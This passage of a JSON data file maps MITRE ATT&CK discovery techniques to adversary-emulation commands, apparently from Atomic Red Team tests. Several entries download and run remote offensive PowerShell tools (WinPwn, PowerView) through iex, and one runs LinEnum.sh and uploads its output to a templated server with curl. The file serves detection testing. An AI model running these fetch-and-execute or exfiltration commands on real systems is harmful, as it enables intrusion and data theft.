            "command": "nltest /domain_trusts && nltest /trusted_domains"
         },
         {
            "description": "Use powershell to enumerate AD information.\nRequires the installation of PowerShell AD admin cmdlets via Windows RSAT or the Windows Server AD DS role.\n",
            "command": "Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"; Get-NetDomainTrust; Get-NetForestTrust; Get-ADDomain; Get-ADGroupMember Administrators -Recursive; ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()"
         },
         {
            "description": "Uses the dsquery command to discover domain trusts.\nRequires the installation of dsquery via Windows RSAT or the Windows Server AD DS role.\n",
            "command": "dsquery * -filter \"(objectClass=trustedDomain)\" -attr *"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Trusts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -gcb -sc trustdmp"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory OUs\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit)"
         },
         {
            "description": "Iterative AD discovery toolkit for offensive operators. Situational awareness and targeted low noise enumeration. Preference for OpSec.- https://github.com/dsnezhkov/TruffleSnout\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" forest -n %userdomain% && \"PathToAtomicsFolder\\..\\ExternalPayloads\\TruffleSnout.exe\" domain -n %userdomain%"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose"
         },
         {
            "description": "Determine the Windows Domain of a computer",
            "command": "Import-Module .\\powerview.ps1 -Force;\nGet-NetDomain | ConvertTo-Json -Depth 1\n"
         }
      ]
   },
   "T1615": {
      "technique_name": "Group Policy Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPORemoteAccessPolicy -consoleoutput -noninteractive"
         },
         {
            "description": "Uses the built-in Windows utility gpresult to display the Resultant Set of Policy (RSoP) information for a remote user and computer\nThe /z parameter displays all available information about Group Policy. More parameters can be found in the linked Microsoft documentation\nhttps://docs.microsoft.com/en-us/windows-server/administration/windows-commands/gpresult\nhttps://unit42.paloaltonetworks.com/emissary-trojan-changelog-did-operation-lotus-blossom-cause-it-to-evolve/\nTurla has used the /z and /v parameters: https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\n",
            "command": "gpresult /z"
         },
         {
            "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
            "command": "Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt"
         },
         {
            "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPOAudit -noninteractive -consoleoutput"
         },
         {
            "description": "Use PowerView to Get-DomainGPO This will only work on Windows 10 Enterprise and A DC Windows 2019.",
            "command": "powershell -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO\""
         }
      ]
   },
   "T1217": {
      "technique_name": "Browser Bookmark Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Searches for Google Chrome's Bookmark file (on macOS) that contains bookmarks in JSON format and lists any found instances to a text file.\n",
            "command": "find / -path \"*/Google/Chrome/*/Bookmarks\" -exec echo {} >> /tmp/T1217-Chrome.txt \\; cat /tmp/T1217-Chrome.txt 2>/dev/null"
         },
         {
            "description": "Searches for Google Chromes's and Edge Chromium's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
            "command": "where /R C:\\Users\\ Bookmarks"
         },
         {
            "description": "Searches for Mozilla Firefox's places.sqlite file (on Linux distributions) that contains bookmarks and lists any found instances to a text file.\n",
            "command": "find / -path \"*.mozilla/firefox/*/places.sqlite\" 2>/dev/null -exec echo {} >> /tmp/T1217-Firefox.txt \\; cat /tmp/T1217-Firefox.txt 2>/dev/null"
         },
         {
            "description": "This test searches for Safari's Bookmarks file (on macOS) and lists any found instances to a text file.\n",
            "command": "find / -path \"*/Safari/Bookmarks.plist\" 2>/dev/null >> /tmp/T1217-Safari.txt ; cat /tmp/T1217-Safari.txt"
         },
         {
            "description": "Searches for Mozilla Firefox's places.sqlite file (on macOS) that contains bookmarks and lists any found instances to a text file.\n",
            "command": "find / -path \"*/Firefox/Profiles/*/places.sqlite\" -exec echo {} >> /tmp/T1217_Firefox.txt \\; cat /tmp/T1217_Firefox.txt 2>/dev/null"
         },
         {
            "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
            "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force"
         },
         {
            "description": "Searches for Mozilla Firefox bookmarks file (on Windows distributions) that contains bookmarks in a SQLITE database.\nUpon execution, paths that contain bookmark files will be displayed.\n",
            "command": "where /R C:\\Users\\ places.sqlite"
         },
         {
            "description": "This test will list the bookmarks for Internet Explorer that are found in the Favorites folder",
            "command": "dir /s /b %USERPROFILE%\\Favorites"
         },
         {
            "description": "Get Chrome Bookmarks",
            "command": "cat ~/Library/Application\\ Support/Google/Chrome/Default/Bookmarks\n"
         }
      ]
   },
   "T1082": {
      "technique_name": "System Information Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Read and Display System Intergrety Protection status. csrutil is commonly used by malware and post-exploitation tools to determine whether certain files and directories on the system are writable or not.\n",
            "command": "csrutil status"
         },
         {
            "description": "Collect general computer informations via GeneralRecon function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Generalrecon -consoleoutput -noninteractive"
         },
         {
            "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
            "command": "set"
         },
         {
            "description": "Discover Local Privilege Escalation possibilities using itm4nprivesc function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); itm4nprivesc -noninteractive -consoleoutput"
         },
         {
            "description": "Identify system hostname for Linux and macOS systems.\n",
            "command": "hostname"
         },
         {
            "description": "The script gathernetworkinfo.vbs is employed to collect system information such as the operating system, DNS details, firewall configuration, etc. Outputs are stored in c:\\Windows\\System32\\config or c:\\Windows\\System32\\reg. https://www.verboon.info/2011/06/the-gathernetworkinfo-vbs-script/\n",
            "command": "wscript.exe C:\\Windows\\System32\\gatherNetworkInfo.vbs"
         },
         {
            "description": "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1'); Invoke-SharpUp -command \"audit\""
         },
         {
            "description": "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
            "command": "wmic cpu get name && wmic MEMPHYSICAL get MaxCapacity && wmic baseboard get product && wmic baseboard get version && wmic bios get SMBIOSBIOSVersion && wmic path win32_VideoController get name && wmic path win32_VideoController get DriverVersion && wmic path win32_VideoController get VideoModeDescription && wmic OS get Caption,OSArchitecture,Version && wmic DISKDRIVE get Caption && Get-WmiObject win32_bios"
         },
         {
            "description": "General privesc checks using the otherchecks function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput"
         },
         {
            "description": "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
            "command": "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\""
         },
         {
            "description": "Powersploits privesc checks using oldchecks function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); oldchecks -noninteractive -consoleoutput"
         },
         {
            "description": "Executes the driverquery command to list drivers installed on the system. Adversaries utilize the feature to enumerate the driver and it can be\nused for Exploitation. \ncommand /v - provide verbose output but not valid for signed drivers\n        /si - provide information about signed drivers \n",
            "command": "driverquery /v && driverquery /si"
         },
         {
            "description": "This script emulates the reconnaissance script seen in used by Griffon and was modified by security researcher Kirk Sayre \nin order simply print the recon results to the screen as opposed to exfiltrating them. [Script](https://gist.github.com/kirk-sayre-work/7cb5bf4e2c7c77fa5684ddc17053f1e5).  \nFor more information see also [https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon](https://malpedia.caad.fkie.fraunhofer.de/details/js.griffon) and [https://attack.mitre.org/software/S0417/](https://attack.mitre.org/software/S0417/)",
            "command": "cscript \"d06deb_griffon_recon.vbs\""
         },
         {
            "description": "Upon successful execution, this test will utilize a valid read-only Azure AD user's credentials to conduct a security scan and determine what users exist in a given tenant, as well as identify any admin users. \nOnce the test is complete, a folder will be output to the temp directory that contains 3 csv files which provide info on the discovered users. \nSee https://github.com/cyberark/SkyArk \n",
            "command": "Import-Module \"PathToAtomicsFolder\\..\\ExternalPayloads\\AzureStealth.ps1\" -force      ; $Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"None\", $Password; Connect-AzAccount -Credential $Credential; Connect-AzureAD -Credential $Credential; Scan-AzureAdmins -UseCurrentCred"
         },
         {
            "description": "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
            "command": "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion && reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion"
         },
         {
            "description": "PowerSharpPack - Seatbelt technique via function of WinPwn.\n\n[Seatbelt](https://github.com/GhostPack/Seatbelt) is a C# project that performs a number of security oriented host-survey \"safety checks\" relevant from both offensive and defensive security perspectives.",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command \"-group=all\"; pause"
         },
         {
            "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
            "command": "env"
         },
         {
            "description": "Enumerate kernel modules installed 3 different ways. Upon successful execution stdout will display kernel modules installed on host 2 times, followed by list of modules matching 'vmw' if present.\n",
            "command": "lsmod; kmod list; grep vmw /proc/modules"
         },
         {
            "description": "Identify virtual machine hardware. This technique is used by the Pupy RAT and other malware.\n",
            "command": "if [ -f /sys/class/dmi/id/bios_version ]; then cat /sys/class/dmi/id/bios_version | grep -i amazon; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/product_name | grep -i \"Droplet\\|HVM\\|VirtualBox\\|VMware\"; fi; if [ -f /sys/class/dmi/id/product_name ]; then cat /sys/class/dmi/id/chassis_vendor | grep -i \"Xen\\|Bochs\\|QEMU\"; fi; if [ -x \"$(command -v dmidecode)\" ]; then sudo dmidecode | grep -i \"microsoft\\|vmware\\|virtualbox\\|quemu\\|domu\"; fi; if [ -f /proc/scsi/scsi ]; then cat /proc/scsi/scsi | grep -i \"vmware\\|vbox\"; fi; if [ -f /proc/ide/hd0/model ]; then cat /proc/ide/hd0/model | grep -i \"vmware\\|vbox\\|qemu\\|virtual\"; fi; if [ -x \"$(command -v lspci)\" ]; then sudo lspci | grep -i \"vmware\\|virtualbox\"; fi; if [ -x \"$(command -v lscpu)\" ]; then sudo lscpu | grep -i \"Xen\\|KVM\\|Microsoft\"; fi"
         },
         {
            "description": "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); RBCD-Check -consoleoutput -noninteractive"
         },
         {
            "description": "Identify System Info\n",
            "command": "system_profiler; ls -al /Applications"
         },
         {
            "description": "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); winPEAS -noninteractive -consoleoutput"
         },
         {
            "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
            "command": "systeminfo && reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum"
         },
         {
            "description": "Identify system hostname for Windows. Upon execution, the hostname of the device will be displayed.\n",
            "command": "hostname"
         },
         {
            "description": "Gathers local system information using the Morerecon function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); Morerecon -noninteractive -consoleoutput"
         },
         {
            "description": "Identify virtual machine guest kernel modules. This technique is used by the Pupy RAT and other malware.\n",
            "command": "sudo lsmod | grep -i \"vboxsf\\|vboxguest\"; sudo lsmod | grep -i \"vmw_baloon\\|vmxnet\"; sudo lsmod | grep -i \"xen-vbd\\|xen-vnif\"; sudo lsmod | grep -i \"virtio_pci\\|virtio_net\"; sudo lsmod | grep -i \"hv_vmbus\\|hv_blkvsc\\|hv_netvsc\\|hv_utils\\|hv_storvsc\""
         },
         {
            "description": "Identify the Windows MachineGUID value for a system. Upon execution, the machine GUID will be displayed from registry.\n",
            "command": "REG QUERY HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography /v MachineGuid"
         },
         {
            "description": "Identify System Info\n",
            "command": "uname -a >> /tmp/T1082.txt; if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> /tmp/T1082.txt; fi; if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> /tmp/T1082.txt; fi   ; if [ -f /etc/issue ]; then cat /etc/issue >> /tmp/T1082.txt; fi; uptime >> /tmp/T1082.txt; cat /tmp/T1082.txt 2>/dev/null"
         },
         {
            "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
            "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson"
         },
         {
            "description": "Download and execute LinEnum.sh",
            "command": "wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh;\nchmod +x LinEnum.sh;\n./LinEnum.sh > /tmp/exfil.txt;\ncurl -F 'data=@/tmp/exfil.txt' #{server}/file/upload ;\ncat /tmp/exfil.txt;\n"
         },
         {
            "description": "Discover the PowerShell version",
            "command": "$PSVersionTable\n"
         },
         {
            "description": "Find OS Version",
            "command": "[environment]::OSVersion.Version\n"
         },
         {
            "description": "Discover all directories containing deletable files by user",
            "command": "find / -type d -user #{host.user.name} \\( -perm -g+w -or -perm -o+w \\) 2>/dev/null -exec ls -adl {} \\;\n"
         }
      ]
   },
   "T1018": {
      "technique_name": "Remote System Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Use the ip neighbour command to display the known link layer (ARP table) addresses for hosts sharing the same network segment. \n",
            "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip neighbour show"
         },
         {
            "description": "Identify remote systems via arp.\n\nUpon successful execution, sh will execute arp to list out the arp cache. Output will be via stdout.\n",
            "command": "if [ -x \"$(command -v arp)\" ]; then : ; else (which yum && yum -y install net-tools)||(which apt-get && apt-get install -y net-tools); fi;  ;  arp -a | grep -v '^?'"
         },
         {
            "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n",
            "command": "Get-AdComputer -Filter *"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc dclist"
         },
         {
            "description": "This test is a Powershell script that enumerates Active Directory to determine computers that are joined to the domain. \nThis test is designed to mimic how SessionGopher can determine the additional systems within a domain, which has been used before by threat actors to aid in lateral movement. \nReference: [Head Fake: Tackling Disruptive Ransomware Attacks](https://www.mandiant.com/resources/head-fake-tackling-disruptive-ransomware-attacks). \nUpon successful execution, this test will output the names of the computers that reside on the domain to the console window. \n",
            "command": "$DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher(\"(ObjectCategory=Computer)\"); $DirectorySearcher.PropertiesToLoad.Add(\"Name\"); $Computers = $DirectorySearcher.findall(); foreach ($Computer in $Computers) {;   $Computer = $Computer.Properties.name;   if (!$Computer) { Continue };   Write-Host $Computer}"
         },
         {
            "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
            "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()"
         },
         {
            "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
            "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}"
         },
         {
            "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
            "command": "nltest.exe /dclist:%userdnsdomain%"
         },
         {
            "description": "Use the ip tcp_metrics command to display the recent cached entries for IPv4 and IPv6 source and destination addresses. \n",
            "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip tcp_metrics show |grep --invert-match \"^127\\.\""
         },
         {
            "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, sh will perform a ping sweep on the 192.168.1.1/24 and echo via stdout if an IP is active.\n",
            "command": "for ip in $(seq 1 254); do ping -c 1 192.168.1.$ip; [ $? -eq 0 ] && echo \"192.168.1.$ip UP\" || : ; done"
         },
         {
            "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n",
            "command": "arp -a"
         },
         {
            "description": "Identify remote systems with net.exe querying the Active Directory Domain Controller.\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Controller\" in the domain. Output will be via stdout.\n",
            "command": "net group /domain \"Domain controllers\""
         },
         {
            "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
            "command": "net view /domain && net view"
         },
         {
            "description": "Use the ip route command to display the kernels routing tables. \n",
            "command": "if [ -x \"$(command -v ip)\" ]; then : ; else apt-get install iproute2 -y; fi;  ;  ip route show"
         },
         {
            "description": "Identify remote systems with net.exe querying the Active Directory Domain Computers group.\n\nUpon successful execution, cmd.exe will execute cmd.exe against Active Directory to list the \"Domain Computers\" group. Output will be via stdout.\n",
            "command": "net group \"Domain Computers\" /domain"
         },
         {
            "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Computer Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
            "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=computer)"
         },
         {
            "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
            "command": "adidnsdump -u domain\\user -p password --print-zones 192.168.1.1"
         },
         {
            "description": "Utilizing PowerView, run Get-DomainController to identify the Domain Controller. Upon execution, information about the domain controller within the domain will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainController -verbose"
         },
         {
            "description": "Identify remote systems via ping sweep.\n\nUpon successful execution, cmd.exe will perform a for loop against the 192.168.1.1/24 network. Output will be via stdout.\n",
            "command": "for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i"
         },
         {
            "description": "The following Atomic test will utilize get-wmiobject to enumerate Active Directory for Domain Controllers.\nUpon successful execution a listing of Systems from AD will output with their paths.\nReference: https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-wmiobject?view=powershell-5.1\n",
            "command": "try { get-wmiobject -class ds_computer -namespace root\\directory\\ldap -ErrorAction Stop }; catch { $_; exit $_.Exception.HResult }"
         },
         {
            "description": "Locate all active IP and FQDNs on the network",
            "command": "arp -a"
         },
         {
            "description": "Get a list of all computers in a domain",
            "command": "Import-Module .\\PowerView.ps1 -Force;\nGet-NetComputer\n"
         },
         {
            "description": "Identify the remote domain controllers",
            "command": "nltest /dsgetdc:%USERDOMAIN%\n"
         },
         {
            "description": "Identify the organizations mail server",
            "command": "host \"#{target.org.domain}\" | grep mail | grep -oE '[^ ]+$' | rev | cut -c 2- | rev"
         },
         {
            "description": "View the known_hosts file",
            "command": "cat ~/.ssh/known_hosts\n"
         },
         {
            "description": "Use PowerView to query the Active Directory server for a list of computers in the Domain",
            "command": "Import-Module .\\powerview.ps1;\nGet-DomainComputer\n"
         },
         {
            "description": "Find hostname of remote IP in domain",
            "command": "nslookup #{remote.host.ip}\n"
         },
         {
            "description": "Find hostname of remote host",
            "command": "nbtstat -A #{remote.host.ip}"
         }
      ]
   },
   "T1614.001": {
      "technique_name": "System Location Discovery: System Language Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Identify System language with the by reading the locale configuration file.\n\nThe locale configuration file contains the `LANG` environment variable which\nwill contain the 5 character locale that can be looked up to correlate the\nlanguage and territory.\n",
            "command": "[ -f /etc/locale.conf ] && cat /etc/locale.conf || cat /etc/default/locale"
         },
         {
            "description": "Identify System language with the chcp command.\n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
            "command": "chcp"
         },
         {
            "description": "Identify System language by checking the environment variables\n\nUpon successful execution, the 5 character locale result can be looked up to\ncorrelate the language and territory. Environment query commands are likely\nto run with a pattern match command e.g. `env | grep LANG`\n\nNote: `env` and `printenv` will usually provide the same results. `set` is\nalso used as a builtin command that does not generate syscall telemetry but\ndoes provide a list of the environment variables.\n",
            "command": "env | grep LANG; printenv LANG; set | grep LANG"
         },
         {
            "description": "Identify System language with the `locale` command.\n\nUpon successful execution, the output will contain the environment variables that indicate\nthe 5 character locale that can be looked up to correlate the language and territory.\n",
            "command": "locale"
         },
         {
            "description": "Identify System language with the `localectl` command.\n\nUpon successful execution, the key `System Locale` from the output will contain the\n`LANG` environment variable that has the 5 character locale result that can be looked\nup to correlate the language and territory.\n",
            "command": "localectl status"
         },
         {
            "description": "Identify System language by querying the registry on an endpoint. \n\nUpon successful execution, result in number format can be looked up to correlate the language.\n",
            "command": "reg query HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Nls\\Language"
         }
      ]
   },
   "T1135": {
      "technique_name": "Network Share Discovery",
      "tactic": "discovery",
      "known implementations": [
         {
            "description": "Network Share Discovery utilizing the dir command prompt. The computer ip variable may need to be modified to point to a different host ip\nUpon execution avalaible network shares will be displayed in the commandline session\n",
            "command": "dir \\\\127.0.0.1\\c$ && dir \\\\127.0.0.1\\admin$ && dir \\\\127.0.0.1\\IPC$"
         },
         {
            "description": "View information about all of the resources that are shared on the local computer Upon execution, avalaible share drives will be displayed in the powershell session",
            "command": "net share"
         },
         {
            "description": "Network share enumeration using the shareenumeration function of WinPwn",
            "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); shareenumeration -noninteractive -consoleoutput"
         },
         {
            "description": "Network Share Discovery using smbstatus\n",
            "command": "sudo smbstatus --shares"
         },
         {
            "description": "Network Share Discovery utilizing the command prompt. The computer name variable may need to be modified to point to a different host\nUpon execution avalaible network shares will be displayed in the powershell session\n",
            "command": "net view \\\\localhost"
         },
         {
            "description": "Enumerate Domain Shares the current user has access. Upon execution, progress info about each share being scanned will be displayed.\n",
            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose"
         },
         {
            "description": "Network Share Discovery utilizing PowerShell. The computer name variable may need to be modified to point to a different host\nUpon execution, avalaible network shares will be displayed in the powershell session\n",
            "command": "get-smbshare"
         },
         {
            "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.",
            "command": "if (Test-Path \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\") { ; } else {New-Item -Type Directory \"C:\\Users\\puma-4\\Desktop\\\" -ErrorAction Ignore -Force | Out-Null; Invoke-WebRequest \"https://raw.githubusercontent.com/darkoperator/Veil-PowerView/8784e33f17ee7543ba2f45e27dc5f08ea3a1b856/PowerView/powerview.ps1\" -OutFile \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"};  ;  Import-Module \"C:\\Users\\puma-4\\Desktop\\PowerView.ps1\"; Invoke-ShareFinder -CheckShareAccess"
         },
         {
            "description": "Network Share Discovery\n",
